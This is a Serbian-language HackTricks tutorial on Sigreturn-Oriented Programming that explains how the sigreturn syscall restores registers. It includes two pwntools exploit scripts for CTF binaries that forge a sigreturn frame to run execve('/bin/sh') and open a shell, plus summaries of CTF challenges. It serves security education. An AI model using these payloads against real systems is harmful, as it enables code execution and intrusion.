# SROP - Sigreturn-Oriented Programming

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

**`Sigreturn`** je poseban **sistemski poziv (syscall)** koji se uglavnom koristi za čišćenje nakon što je rukovalac signala završio svoje izvršavanje. Signali su prekidi koje operativni sistem šalje programu, često da bi ukazao da se desila neka izuzetna situacija. Kada program primi signal, privremeno pauzira svoj trenutni rad kako bi obradio signal pomoću **rukovaoca signala**, posebne funkcije dizajnirane za rukovanje signalima.

Nakon što rukovalac signala završi, program mora da **nastavi svoje prethodno stanje** kao da se ništa nije desilo. Tu dolazi do izražaja **`sigreturn`**. Pomaže programu da **vrati se iz rukovaoca signala** i vraća stanje programa čišćenjem okvira steka (sekcija memorije koja čuva pozive funkcija i lokalne promenljive) koji je korišćen od strane rukovaoca signala.

Interesantan deo je kako **`sigreturn`** vraća stanje programa: to čini tako što čuva **sve vrednosti registara CPU-a na steku.** Kada signal više nije blokiran, **`sigreturn` izbacuje ove vrednosti sa steka**, efikasno resetujući registre CPU-a na njihovo stanje pre rukovanja signalom. To uključuje registar pokazivača steka (RSP), koji pokazuje na trenutni vrh steka.

{% hint style="danger" %}
Pozivanjem sistemskog poziva **`sigreturn`** iz ROP lanca i **dodavanjem vrednosti registara** koje želimo da učita na **stek** moguće je **kontrolisati** sve vrednosti registara i stoga **pozvati** na primer sistemski poziv `execve` sa `/bin/sh`.
{% endhint %}

Primetite kako bi ovo bila **vrsta Ret2syscall** koja olakšava kontrolisanje parametara za pozivanje drugih Ret2syscall-ova:

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

Ako ste radoznali, ovo je **struktura sigcontext-a** smeštena na steku kako bi se kasnije povratile vrednosti (dijagram sa [**ovde**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Za bolje objašnjenje pogledajte i:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Primer

Možete [**pronaći primer ovde**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) gde je poziv za signeturn konstruisan putem ROP-a (stavljanjem vrednosti `0xf` u rxa), iako je ovo konačan eksploit od tamo:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Proverite i [**eksploit ovde**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) gde je binarni već pozivao `sigreturn` i stoga nije potrebno to graditi sa **ROP**:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Ostali Primeri & Reference

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Assembly binarni fajl koji omogućava **pisanje na stek** i zatim poziva **`sigreturn`** sistemski poziv. Moguće je napisati na steku [**ret2syscall**](rop-syscall-execv/) putem **sigreturn** strukture i pročitati zastavu koja se nalazi u memoriji binarnog fajla.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Assembly binarni fajl koji omogućava **pisanje na stek** i zatim poziva **`sigreturn`** sistemski poziv. Moguće je napisati na steku [**ret2syscall**](rop-syscall-execv/) putem **sigreturn** strukture (binarni fajl sadrži string `/bin/sh`).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bita, bez relro-a, bez canary-ja, nx, bez pie-a. Jednostavno preplavljivanje bafera zloupotrebom `gets` funkcije sa nedostatkom gedžeta koji izvršava [**ret2syscall**](rop-syscall-execv/). ROP lanac upisuje `/bin/sh` u `.bss` pozivajući ponovo gets, zloupotrebljava **`alarm`** funkciju da postavi eax na `0xf` kako bi pozvao **SROP** i izvršio shell.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bitni program u sklopu montaže, bez relro-a, bez canary-ja, nx, bez pie-a. Tok omogućava pisanje na stek, kontrolu nekoliko registara, poziv sistemskog poziva i zatim poziva `exit`. Izabrani sistemski poziv je `sigreturn` koji će postaviti registre i pomeriti `eip` da pozove prethodnu instrukciju sistemskog poziva i pokrene `memprotect` da postavi prostor binarnog fajla na `rwx` i postavi ESP u prostor binarnog fajla. Nastavljajući tok, program će ponovo pozvati čitanje u ESP, ali u ovom slučaju ESP će pokazivati na sledeću instrukciju tako da će prosleđivanje shell koda napisati kao sledeću instrukciju i izvršiti je.
